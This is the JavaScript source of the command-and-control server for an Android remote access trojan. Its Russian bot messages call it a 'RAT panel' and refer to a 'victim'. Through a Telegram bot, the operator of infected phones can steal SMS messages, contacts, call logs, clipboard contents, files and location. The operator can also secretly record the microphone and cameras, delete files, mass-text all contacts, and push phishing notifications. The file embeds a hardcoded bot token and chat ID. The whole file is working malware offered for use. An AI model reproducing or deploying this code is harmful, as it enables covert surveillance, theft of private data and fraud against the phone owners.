const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '7626359976:AAEJFp1sXVJci1v9WasvCqwey8X2pDeczRw'
const id = '1271362249'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• Сообщение от <b>${req.headers.model}</b> устройства`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• Сообщение от <b>${req.headers.model}</b> устройства\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• Расположение от <b>${req.headers.model}</b> устройства`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• Подключено новое устройство\n\n` +
        `• Модель: <b>${model}</b>\n` +
        `• Заряд батареи: <b>${battery}</b>\n` +
        `• Версия Android: <b>${version}</b>\n` +
        `• Яркость экрана: <b>${brightness}</b>\n` +
        `• Провайдер: <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• Устройство отключено\n\n` +
            `• Модель: <b>${model}</b>\n` +
            `• Заряд батареи: <b>${battery}</b>\n` +
            `• Версия Android: <b>${version}</b>\n` +
            `• Яркость экрана: <b>${brightness}</b>\n` +
            `• Провайдер: <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• Пожалуйста, укажите номер, на который вы хотите отправить SMS')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• Отлично, теперь введите сообщение, которое вы хотите отправить на этот номер\n\n' +
                '• Будьте осторожны, сообщение не будет отправлено, если количество символов в сообщении превышает допустимое',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• Отлично, теперь введите сообщение, которое вы хотите отправить на этот номер')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Ваш запрос обрабатывается\n\n' +
                '• Вы получите ответ в ближайшие несколько минут.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Введите сообщение, которое вы хотите отправить всем контактам')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Ваш запрос обрабатывается\n\n' +
                '• Вы получите ответ в ближайшие несколько минут.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Введите путь к файлу, который вы хотите загрузить')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Ваш запрос обрабатывается\n\n' +
                '• Вы получите ответ в ближайшие несколько минут',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Введите путь к файлу, который вы хотите удалить')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Ваш запрос обрабатывается\n\n' +
                '• Вы получите ответ в ближайшие несколько минут',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Введите продолжительность записи микрофона')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Ваш запрос обрабатывается\n\n' +
                '• Вы получите ответ в ближайшие несколько минут',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Введите продолжительность, на которую вы хотите записать изображение с основной камеры')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Ваш запрос обрабатывается\n\n' +
                '• Вы получите ответ в ближайшие несколько минут',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Введите продолжительность записи селфи камеры')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Ваш запрос обрабатывается\n\n' +
                '• Вы получите ответ в ближайшие несколько минут',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Введите сообщение, которое вы хотите отобразить на целевом устройстве.')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Ваш запрос обрабатывается\n\n' +
                '• Вы получите ответ в ближайшие несколько минут',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Введите сообщение, которое вы хотите видеть в уведомлениях.')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• Отлично, теперь введите ссылку, которую вы хотите открыть при уведомлении\n\n' +
                '• Когда жертва нажмет на уведомление, откроется ссылка, которую вы вводите',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• Отлично, теперь введите ссылку, которую вы хотите открыть при уведомлении.')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Ваш запрос обрабатывается\n\n' +
                '• Вы получите ответ в ближайшие несколько минут',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Введите ссылку на аудиофайл, который вы хотите воспроизвести')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Ваш запрос обрабатывается\n\n' +
                '• Вы получите ответ в ближайшие несколько минут',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• Приветствую в RAT панели\n\n' +
                '• Если приложение установлено на целевом устройстве, дождитесь подключения\n\n' +
                '• Получение сообщения о подключении означает, что целевое устройство подключено и готово к приему команды.\n\n' +
                '• Нажмите на кнопку команды и выберите нужное устройство, затем выберите нужную команду.\n\n' +
                '• Если вы застряли где-то в боте, отправьте команду /start',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• Нет доступных устройств\n\n' +
                    '• Убедитесь, что приложение установлено на целевом устройстве.'
                )
            } else {
                let text = '°• Список подключенных устройств:\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• Модель: <b>${value.model}</b>\n` +
                        `• Заряд батареи: <b>${value.battery}</b>\n` +
                        `• Версия Android: <b>${value.version}</b>\n` +
                        `• Яркость экрана: <b>${value.brightness}</b>\n` +
                        `• Провайдер: <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• Нет доступных устройств\n\n' +
                    '• Убедитесь, что приложение установлено на целевом устройстве.'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• Выберите устройство для выполнения команды', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• Доступ запрещен')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• Выберите команду для устройства: <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'Приложения', callback_data: `apps:${uuid}`},
                        {text: 'Информация об устройстве', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'Получить файл', callback_data: `file:${uuid}`},
                        {text: 'Удалить файл', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'Буфер обмена', callback_data: `clipboard:${uuid}`},
                        {text: 'Микрофон', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'Основная камера', callback_data: `camera_main:${uuid}`},
                        {text: 'Селфи камера', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'Локация', callback_data: `location:${uuid}`},
                        {text: 'Тост', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'Журнал вызовов', callback_data: `calls:${uuid}`},
                        {text: 'Контакты', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'Вибрация', callback_data: `vibrate:${uuid}`},
                        {text: 'Показывать уведомления', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'Сообщения', callback_data: `messages:${uuid}`},
                        {text: 'Отправить сообщение', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'Воспроизвести аудио', callback_data: `play_audio:${uuid}`},
                        {text: 'Остановить аудио', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: 'Отправить сообщение всем контактам',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Ваш запрос обрабатывается\n\n' +
            '• Вы получите ответ в ближайшие несколько минут',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Ваш запрос обрабатывается\n\n' +
            '• Вы получите ответ в ближайшие несколько минут',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Ваш запрос обрабатывается\n\n' +
            '• Вы получите ответ в ближайшие несколько минут',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Ваш запрос обрабатывается\n\n' +
            '• Вы получите ответ в ближайшие несколько минут',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Ваш запрос обрабатывается\n\n' +
            '• Вы получите ответ в ближайшие несколько минут',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Ваш запрос обрабатывается\n\n' +
            '• Вы получите ответ в ближайшие несколько минут',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Ваш запрос обрабатывается\n\n' +
            '• Вы получите ответ в ближайшие несколько минут',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Ваш запрос обрабатывается\n\n' +
            '• Вы получите ответ в ближайшие несколько минут',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Ваш запрос обрабатывается\n\n' +
            '• Вы получите ответ в ближайшие несколько минут',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Ваш запрос обрабатывается\n\n' +
            '• Вы получите ответ в ближайшие несколько минут',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Ваш запрос обрабатывается\n\n' +
            '• Вы получите ответ в ближайшие несколько минут',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Пожалуйста, укажите номер, на который вы хотите отправить SMS.\n\n' +
            '• Если вы хотите отправить смс на местные номера страны, вы можете ввести номер с нулем в начале, в противном случае введите номер с кодом страны (+7)',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Введите сообщение, которое вы хотите отправить всем контактам.\n\n' +
            '• Будьте осторожны, сообщение не будет отправлено, если количество символов в сообщении превышает допустимое',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Введите путь к файлу, который вы хотите загрузить.\n\n' +
            '• Вам не нужно вводить полный путь к файлу, просто введите основной путь. Например, введите<b> DCIM/Camera </b> для получения файлов галереи.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Введите путь к файлу, который вы хотите удалить\n\n' +
            '• Вам не нужно вводить полный путь к файлу, просто введите основной путь. Например, введите<b> DCIM/Camera </b>, чтобы удалить файлы галереи.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Введите продолжительность записи микрофона\n\n' +
            '• Обратите внимание, что время необходимо вводить в числовом виде в секундах. Тоесть<b> 1 Мин - 60 </b>',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Введите сообщение, которое вы хотите отобразить на целевом устройстве\n\n' +
            '• Тост — это короткое сообщение, которое появляется на экране устройства на несколько секунд.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Введите сообщение, которое вы хотите видеть в качестве уведомления\n\n' +
            '• Ваше сообщение появится в строке состояния целевого устройства как обычное уведомление.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Введите ссылку на аудиофайл, который вы хотите воспроизвести\n\n' +
            '• Обратите внимание, что необходимо ввести прямую ссылку на нужный звук, иначе звук не будет воспроизведен',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
